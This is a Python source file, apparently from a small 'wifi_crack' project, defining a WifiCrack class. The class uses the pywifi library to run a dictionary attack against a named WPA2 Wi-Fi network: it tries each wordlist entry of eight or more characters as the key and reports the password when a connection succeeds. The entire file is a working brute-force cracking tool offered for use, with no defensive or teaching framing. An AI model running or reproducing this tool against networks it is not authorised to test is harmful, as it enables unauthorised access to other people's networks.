'''
Description:
Author: Senkita
Date: 2021-02-15 08:53:46
LastEditors: Senkita
LastEditTime: 2021-02-15 08:56:42
'''
import pywifi
import time
import sys
import getopt
from wifi_crack.utils import Error


class WifiCrack:
    def __init__(self) -> None:
        self.wifi_name = None
        self.file_path = None
        self.interval_time = 2
        self.get_args()

        self.wifi = pywifi.PyWiFi()
        self.wlan = self.wifi.interfaces()[0]

    def connect_wifi(self, password: str) -> bool:
        """[连接无线]

        Args:
            password (str): [密码]

        Returns:
            bool: [连接结果]
        """
        self.wlan.disconnect()

        if self.wlan.status() == pywifi.const.IFACE_DISCONNECTED:
            config = pywifi.Profile()
            config.ssid = self.wifi_name
            config.auth = pywifi.const.AUTH_ALG_OPEN
            config.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
            config.cipher = pywifi.const.CIPHER_TYPE_CCMP
            config.key = password

            self.wlan.remove_all_network_profiles()
            profile = self.wlan.add_network_profile(config)
            self.wlan.connect(profile)

            time.sleep(self.interval_time)
            if self.wlan.status() == pywifi.const.IFACE_CONNECTED:
                return True

            print('{}尝试失败...'.format(password), end='\r')
            return False

    def check_password(self) -> None:
        """[读取字典]

        Raises:
            e: [异常]
        """
        with open(self.file_path, 'r') as f:
            line = f.readline()
            while line:
                password = line.strip()
                if len(password) >= 8:
                    if self.connect_wifi(password):
                        print('成功破解{}！密码是：{}'.format(self.wifi_name, password))
                        break
                line = f.readline()

    def get_args(self) -> None:
        """[获取参数]

        Raises:
            e: [异常]
        """
        argv = sys.argv[1:]
        try:
            opts, _ = getopt.getopt(argv, 'n:f:t:')
        except Exception as e:
            raise e

        for opt, arg in opts:
            if opt in ['-n']:
                self.wifi_name = arg
            elif opt in ['-f']:
                self.file_path = arg
            elif opt in ['-t']:
                self.interval_time = int(arg)

        if self.wifi_name is None:
            raise Error('引发异常：无线名未指定。')
        elif self.file_path is None:
            raise Error('引发异常：字典文件未指定。')
